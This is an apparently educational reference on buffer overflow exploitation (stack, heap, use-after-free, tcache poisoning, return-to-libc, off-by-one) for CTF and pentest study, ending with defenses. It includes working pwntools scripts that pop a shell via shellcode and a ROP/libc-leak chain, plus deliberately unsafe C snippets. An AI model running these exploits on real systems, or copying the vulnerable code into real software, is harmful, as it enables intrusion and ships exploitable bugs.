# Buffer Overflow Techniques Reference

> **Authorization Notice**: These techniques are documented for educational purposes, CTF competitions, and authorized penetration testing only. Never test against systems without explicit written permission.

## Stack-Based Buffer Overflow — Step by Step

### Understanding the Vulnerable Code

```c
void vulnerable_function(char *input) {
    char buffer[64];       // 64-byte local buffer on the stack
    strcpy(buffer, input); // No bounds checking — classic overflow
}
```

### Stack Layout Before Overflow

When `vulnerable_function` is called, the stack looks like this:

```
High Address
+========================+
|    ... caller's        |
|    stack frame ...     |
+------------------------+
|  Return Address (4B)   |  <- Saved EIP: where to resume after return
+------------------------+
|  Saved EBP (4B)        |  <- Caller's frame pointer
+------------------------+
|                        |
|  buffer[64]            |  <- 64 bytes of local storage
|  (64 bytes)            |
|                        |
+------------------------+  <- ESP points here (stack top)
Low Address
```

### Step 1: Determine the Offset

The distance from the start of `buffer` to the saved return address is:
- 64 bytes (buffer) + 4 bytes (saved EBP) = **68 bytes** to reach the return address

Using cyclic patterns to find this empirically:

```bash
# Generate a cyclic pattern (GEF/pwndbg)
gef> pattern create 100

# Run the program with the pattern as input
gef> run < <(pattern create 100)

# When it crashes, find the offset from the value in EIP
gef> pattern offset $eip
# Output: Found at offset 68
```

### Step 2: Control EIP

```
Input: [ 68 bytes of padding ][ 4 bytes: new return address ]

Stack After Overflow:
+========================+
|  Return Address        |  <- OVERWRITTEN with attacker's address
+------------------------+
|  Saved EBP             |  <- OVERWRITTEN (part of padding)
+------------------------+
|  AAAAAAAAAAAAAAAA      |
|  AAAAAAAAAAAAAAAA      |  <- buffer filled with 'A' (0x41)
|  AAAAAAAAAAAAAAAA      |
|  AAAAAAAAAAAAAAAA      |
+------------------------+
```

### Step 3: Redirect Execution with NOP Sled

Place shellcode after the return address, and point EIP into a NOP sled:

```
Input Layout:
[68 bytes padding][ret addr -> NOP sled][NOP NOP NOP ... NOP][shellcode]

Stack After Overflow:
+========================+
|  shellcode             |  <- Payload executes here
|  \x31\xc0\x50\x68...  |
+------------------------+
|  NOP sled              |  <- 0x90 0x90 0x90 ...
|  (landing zone)        |     Return address points somewhere in here
+------------------------+
|  Return Address        |  <- Points into the NOP sled above
+------------------------+
|  Saved EBP             |  <- Overwritten
+------------------------+
|  Padding (68 bytes)    |  <- Junk data to reach saved return address
+------------------------+
```

### Step 4: Python Exploit (using pwntools)

```python
from pwn import *

# Setup
binary = ELF('./vulnerable')
p = process('./vulnerable')

# Find offset (already determined: 68)
offset = 68

# Build payload
nop_sled = b'\x90' * 100
shellcode = asm(shellcraft.sh())  # /bin/sh shellcode

# Approximate address of NOP sled on stack
# (determined via GDB: examine $esp after overflow)
ret_addr = p32(0xbffff7a0)

payload = b'A' * offset + ret_addr + nop_sled + shellcode

p.sendline(payload)
p.interactive()
```

---

## Stack Overflow on x86-64

The 64-bit case differs in several important ways:

```
Stack Layout (x86-64):
+========================+
|  Return Address (8B)   |  <- Saved RIP (8 bytes, not 4)
+------------------------+
|  Saved RBP (8B)        |  <- 8 bytes
+------------------------+
|  buffer[64]            |  <- May have different alignment
+------------------------+
```

Key differences:
- Addresses are 8 bytes and contain null bytes in the upper portion (e.g., `0x00007fff12345678`)
- NX is almost always enabled — stack shellcode rarely works; use ROP instead
- Function arguments pass in registers (RDI, RSI, RDX, ...), not on the stack
- Stack must be 16-byte aligned before `call` instructions

### 64-bit ROP Example

```python
from pwn import *

binary = ELF('./vulnerable64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vulnerable64')

offset = 72  # 64-byte buffer + 8-byte saved RBP

# Find ROP gadgets
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # For stack alignment

# Leak libc address via puts@plt
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])     # Argument: GOT entry of puts
payload += p64(binary.plt['puts'])     # Call puts to print the address
payload += p64(binary.symbols['main']) # Return to main for second stage

p.sendline(payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Second stage: call system("/bin/sh")
payload2 = b'A' * offset
payload2 += p64(ret)                          # Stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendline(payload2)
p.interactive()
```

---

## Heap-Based Overflow Concepts

### Heap Chunk Structure (glibc malloc)

```
Allocated Chunk:                    Free Chunk:
+------------------+               +------------------+
| prev_size (8B)   | (if prev free)| prev_size (8B)   |
+------------------+               +------------------+
| size | flags     | (A, M, P bits)| size | flags     |
+------------------+               +------------------+
|                  |               | fd (fwd pointer) |
| User Data        |               +------------------+
|                  |               | bk (bck pointer) |
+------------------+               +------------------+
                                   | (old user data)  |
                                   +------------------+
```

### Heap Overflow Scenario

```c
struct data {
    char buffer[64];
    void (*callback)(void);  // Function pointer after buffer
};

struct data *obj = malloc(sizeof(struct data));
obj->callback = safe_function;
gets(obj->buffer);    // Overflow buffer into callback pointer
obj->callback();      // Calls attacker-controlled address
```

```
Heap Layout:
+========================+
| chunk header           |
+------------------------+
| buffer[64]             |  <- Overflow starts here
| AAAAAAAAAA...          |
+------------------------+
| callback pointer       |  <- Overwritten with attacker's address
+========================+
```

### Use-After-Free Pattern

```c
// Step 1: Allocate and free object A
struct victim *a = malloc(sizeof(struct victim));  // has function pointer
free(a);  // a is freed but pointer still exists

// Step 2: Allocate object B of same size — gets same memory
char *b = malloc(sizeof(struct victim));
memcpy(b, attacker_data, sizeof(struct victim));  // Attacker controls content

// Step 3: Use dangling pointer — now points to attacker data
a->function_ptr();  // Calls attacker-controlled address
```

### tcache Poisoning (Modern glibc >= 2.26)

```
tcache is a per-thread, per-size-class singly-linked list of free chunks.

Normal tcache free list:
HEAD -> chunk_A -> chunk_B -> NULL

After tcache poisoning (overwrite chunk_A's fd pointer):
HEAD -> chunk_A -> FAKE_ADDR -> ???

Next two mallocs of this size:
  1st malloc -> returns chunk_A
  2nd malloc -> returns FAKE_ADDR (arbitrary address!)
```

---

## Return-to-libc Technique

When the stack is non-executable (NX/DEP enabled), return-to-libc redirects execution to existing library functions.

### 32-bit Return-to-libc Stack Layout

```
After Overflow (32-bit):
+========================+
| ptr to "/bin/sh"       |  <- Argument to system()
+------------------------+
| address of exit()      |  <- Fake return address (clean exit)
+------------------------+
| address of system()    |  <- Overwrites saved return address
+------------------------+
| Saved EBP (junk)       |  <- Overwritten
+------------------------+
| Padding (buffer size)  |  <- Fills the buffer
+------------------------+
```

When the function returns:
1. `ret` pops `system()` address into EIP
2. Execution jumps to `system()`
3. `system()` sees the stack frame: return address = `exit()`, first arg = `"/bin/sh"`
4. Shell is spawned

### Finding Required Addresses

```bash
# Find system() in libc
gdb> p system
$1 = {<text variable>} 0xb7e5f430 <system>

# Find exit() in libc
gdb> p exit
$2 = {<text variable>} 0xb7e52fb0 <exit>

# Find "/bin/sh" string in libc
gdb> find &system, +9999999, "/bin/sh"
0xb7f82a24
```

---

## Off-By-One Exploitation

### The Vulnerability

```c
void copy_input(char *src) {
    char buffer[256];
    int i;
    // Off-by-one: loop copies one byte too many
    for (i = 0; i <= 256; i++) {  // Should be i < 256
        buffer[i] = src[i];
    }
}
```

### Frame Pointer Overwrite

The single extra byte overwrites the LSB (least significant byte) of the saved EBP:

```
Before:                          After off-by-one:
+-------------------+           +-------------------+
| Return Address    |           | Return Address    |  (unchanged)
+-------------------+           +-------------------+
| Saved EBP         |           | Saved EBP         |  LSB corrupted!
| 0xBFFFF7A8        |           | 0xBFFFF700        |  (example)
+-------------------+           +-------------------+
| buffer[256]       |           | buffer[256]       |
| ...               |           | ... (attacker     |
|                   |           |      controlled)   |
+-------------------+           +-------------------+
```

### Exploitation Chain

1. The corrupted EBP is restored by the calling function's `leave` instruction (`mov esp, ebp; pop ebp`)
2. ESP now points to a location the attacker can influence
3. The subsequent `ret` pops EIP from this attacker-controlled location
4. The attacker places a desired return address at the manipulated stack location

```
Caller executes `leave; ret`:
  leave:
    mov esp, ebp    <- ESP = corrupted EBP (attacker-influenced)
    pop ebp         <- EBP = value from attacker-controlled memory
  ret:
    pop eip         <- EIP = NEXT value from attacker-controlled memory
                       -> Redirected execution!
```

---

## Exploit Development Checklist

1. **Identify protections**: `checksec ./binary`
   ```
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE
   ```

2. **Map the attack surface**: What input reaches vulnerable code paths?

3. **Determine overflow size**: Use cyclic patterns or manual calculation

4. **Check constraints**:
   - Bad characters (null bytes, newlines, spaces)?
   - Input length limits?
   - Which mitigations must be bypassed?

5. **Choose technique**:
   | Protections | Technique |
   |---|---|
   | None | Direct shellcode on stack |
   | NX only | Return-to-libc or ROP |
   | NX + ASLR | Leak + ROP |
   | NX + ASLR + Canary | Leak canary + Leak libc + ROP |
   | Full (NX+ASLR+Canary+PIE+Full RELRO) | Multiple leaks + ROP with careful targeting |

6. **Build exploit**: Use pwntools for reliability and portability

7. **Test locally**: Reproduce in controlled environment

8. **Document**: Record the vulnerability, its impact, and recommended fix

---

## Defensive Recommendations

For each overflow type, the corresponding defenses:

| Vulnerability | Primary Defense | Additional Hardening |
|---|---|---|
| Stack buffer overflow | Bounds-checked functions (`strncpy`, `snprintf`) | Stack canaries, ASLR, NX, PIE |
| Heap overflow | Bounds checking, safe allocator APIs | Heap integrity checks (glibc hardened, jemalloc) |
| Use-after-free | Nullify pointers after free, smart pointers (C++) | AddressSanitizer, memory tagging (MTE) |
| Off-by-one | Careful loop bounds (`<` not `<=`) | Stack canaries, ASLR |
| Format string | Never pass user input as format string | Compile with `-Wformat -Wformat-security` |
| Integer overflow | Use safe integer arithmetic libraries | Compiler flags (`-ftrapv`, `-fwrapv`) |
